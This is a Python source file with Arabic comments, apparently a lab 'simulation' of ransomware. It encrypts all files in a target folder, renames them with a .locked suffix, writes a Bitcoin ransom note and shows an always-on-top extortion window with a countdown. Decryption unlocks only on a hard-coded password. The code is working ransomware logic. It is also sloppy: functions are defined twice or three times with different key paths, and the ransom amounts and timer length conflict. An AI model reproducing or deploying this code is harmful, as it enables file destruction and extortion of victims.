import os
import sys
import tkinter as tk
from tkinter import messagebox, simpledialog
from cryptography.fernet import Fernet
import datetime  # مكتبة للوقت


# ==========================================
# 1. إعدادات المسار (الذكية)
# ==========================================
# تعديل المسار الثابت (عشان يشتغل من أي مكان)
# ==========================================

# 🔴 غيري هذا المسار بالمسار اللي نسختيه من التيرمينال
FIX_TARGET_PATH = r"/home/kali/PyCharmMiscProject/dist/target_folder"

# 🔴 وهذا مسار المفتاح (يكون بجانب مجلد التارجت في dist)
FIX_KEY_PATH = r"/home/kali/PyCharmMiscProject/dist/thekey.key"

def get_target_files():
    # نستخدم المسار الثابت اللي حددناه فوق
    target_path = FIX_TARGET_PATH

    files_list = []

    if os.path.exists(target_path):
        for filename in os.listdir(target_path):
            full_path = os.path.join(target_path, filename)
            # نستبعد ملفات النظام
            if os.path.isfile(full_path) and not filename.endswith(".exe"):
                files_list.append(full_path)
    else:
        print(f"المسار غير موجود: {target_path}")

    return files_list, target_path

def load_or_generate_key():
    # نستخدم مسار المفتاح الثابت
    if os.path.exists(FIX_KEY_PATH):
        return open(FIX_KEY_PATH, "rb").read()
    else:
        # لو المفتاح مش موجود، ننشئه في مكانه الثابت
        key = Fernet.generate_key()
        with open(FIX_KEY_PATH, "wb") as key_file:
            key_file.write(key)
        return key



def get_target_files():
    # نستخدم المسار الثابت اللي حددناه فوق
    target_path = FIX_TARGET_PATH

    files_list = []

    if os.path.exists(target_path):
        for filename in os.listdir(target_path):
            full_path = os.path.join(target_path, filename)
            # نستبعد ملفات النظام
            if os.path.isfile(full_path) and not filename.endswith(".exe"):
                files_list.append(full_path)
    else:
        print(f"المسار غير موجود: {target_path}")

    return files_list, target_path


def load_or_generate_key():
    # نستخدم مسار المفتاح الثابت
    if os.path.exists(FIX_KEY_PATH):
        return open(FIX_KEY_PATH, "rb").read()
    else:
        # لو المفتاح مش موجود، ننشئه في مكانه الثابت
        key = Fernet.generate_key()
        with open(FIX_KEY_PATH, "wb") as key_file:
            key_file.write(key)
        return key


# ==========================================
# 2. المحرك (تشفير + تغيير أسماء)
# ==========================================
def load_or_generate_key():
    if os.path.exists("thekey.key"):
        return open("thekey.key", "rb").read()
    else:
        key = Fernet.generate_key()
        with open("thekey.key", "wb") as key_file:
            key_file.write(key)
        return key


def encrypt_all():
    key = load_or_generate_key()
    files, folder_path = get_target_files()

    # 1. إنشاء رسالة الفدية في المجلد
    ransom_note = os.path.join(folder_path, "Payment instructions.txt")
    with open(ransom_note, "w") as f:
        f.write("ALL YOUR FILES ARE ENCRYPTED!\nPay $30,000 Bitcoin to get the password.\n send the money to this number : 3010333030 \n Contact: hacker@darkweb.com")

        # 2. التشفير وتغيير الاسم
    for file_path in files:
        try:
            # إذا كان الملف غير مشفر (لا ينتهي بـ .locked)
            if not file_path.endswith(".locked"):
                with open(file_path, "rb") as f:
                    data = f.read()
                encrypted_data = Fernet(key).encrypt(data)

                # كتابة البيانات المشفرة
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)

                    # تغيير الاسم (إضافة .locked)
                os.rename(file_path, file_path + ".locked")
        except Exception:
            pass


def decrypt_all():
    key = load_or_generate_key()
    files, folder_path = get_target_files()

    count = 0
    for file_path in files:
        try:
            # نفك التشفير فقط للملفات التي تنتهي بـ .locked
            if file_path.endswith(".locked"):
                with open(file_path, "rb") as f:
                    data = f.read()
                decrypted_data = Fernet(key).decrypt(data)

                # إعادة البيانات الأصلية
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)

                    # إزالة .locked من الاسم ليرجع لطبيعته
                original_name = file_path.replace(".locked", "")
                os.rename(file_path, original_name)
                count += 1
        except Exception:
            pass

            # حذف رسالة الفدية بعد النجاح
    ransom_note = os.path.join(folder_path, "Payment instructions.txt")
    if os.path.exists(ransom_note):
        os.remove(ransom_note)

    return count


# ==========================================
# 3. الواجهة الاحترافية (مع عداد وقت)
# ==========================================
def start_attack_simulation():
    encrypt_all()

    root = tk.Tk()
    root.title("Ransomware Attack")
    root.geometry("650x450")
    root.configure(bg='#1a0000')  # أحمر غامق جداً

    # العنوان الرئيسي
    tk.Label(root, text="☠️ YOUR FILES ARE LOCKED! ☠️", font=("Impact", 24), fg="red", bg='#1a0000').pack(pady=20)

    # رسالة شرح
    msg = """  
    We have encrypted all your photos and documents with strong algorithms.  
    There is NO WAY to recover them without our special key. 
    You cannot open them anymore. Look at the file names!  

    To get the key, you must pay $300 in Bitcoin. immediately. 
    After payment, click the button below and enter the transaction Password. 
    """
    tk.Label(root, text=msg, font=("Arial", 11), fg="white", bg='#1a0000', justify="center").pack()

    # --- ميزة العد التنازلي ---
    time_label = tk.Label(root, text="Time Left: 24:00:00", font=("Consolas", 18, "bold"), fg="yellow", bg='#1a0000')
    time_label.pack(pady=10)

    # دالة تحديث الوقت
    def update_timer(seconds_left=3600):  # 24 ساعة
        if seconds_left > 0:
            # تحويل الثواني لشكل ساعة:دقيقة:ثانية
            display_time = str(datetime.timedelta(seconds=seconds_left))
            time_label.config(text=f"Time Left: {display_time}")
            # استدعاء الدالة مرة أخرى بعد 1000 ميلي ثانية (ثانية واحدة)
            root.after(1000, update_timer, seconds_left - 1)
        else:
            time_label.config(text="TIME OVER! FILES DELETED!", fg="red")

    update_timer()  # بدء العداد

    # زر الدفع
    def on_decrypt_btn():
        password = simpledialog.askstring("Security Check", "Enter Decryption Password:", parent=root)
        if password == "money2024":
            n = decrypt_all()
            if n > 0:
                messagebox.showinfo("Success", f"Payment Verified!\n{n} files recovered successfully.")
                root.destroy()
            else:
                messagebox.showwarning("Info", "Password correct, but no locked files found.")
        else:
            messagebox.showerror("Error", "Incorrect Password!\nDon't play games with us.")

    tk.Button(root, text="I WILL PAID .. 🔓 DECRYPT FILES NOW", command=on_decrypt_btn, bg="red", fg="white",
              font=("Arial", 12, "bold"), padx=20).pack(pady=30)

    root.attributes('-topmost', True)
    root.mainloop()


if __name__ == "__main__":
    start_attack_simulation()

